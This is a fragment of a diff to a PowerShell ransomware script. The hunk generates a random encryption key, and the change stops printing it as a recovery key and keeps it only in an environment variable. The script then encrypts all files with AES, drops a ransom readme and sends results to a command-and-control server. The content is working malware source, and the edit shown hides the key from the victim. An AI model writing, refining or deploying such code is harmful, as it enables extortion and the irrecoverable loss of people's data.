@@ -330,8 +330,8 @@ else {
 
    Write-Host "[+] Generating new random string key for encryption.." -ForegroundColor Blue
    $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})
-   Write-Host "Recovery Key: $PSRKey"
    $env:PSRKey = $PSRKey
+   Write-Host "[+] Recovery key saved in PSRKey environment variable"
 
    Write-Host "[!] Encrypting all files with 256 bits AES key.." -ForegroundColor Red
    CreateReadme ; EncryptFiles ; if ($C2Status) { SendResults ; sleep 1
